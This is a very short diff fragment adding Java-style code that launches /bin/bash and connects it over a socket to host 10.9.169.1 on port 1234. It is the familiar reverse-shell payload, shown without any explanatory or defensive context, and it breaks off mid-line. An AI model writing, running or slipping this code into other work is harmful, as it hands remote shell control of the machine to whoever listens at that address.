@@ -1,0 +1,4 @@
+String host="10.9.169.1"
+int port=1234
+String cmd ="/bin/bash"
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.get
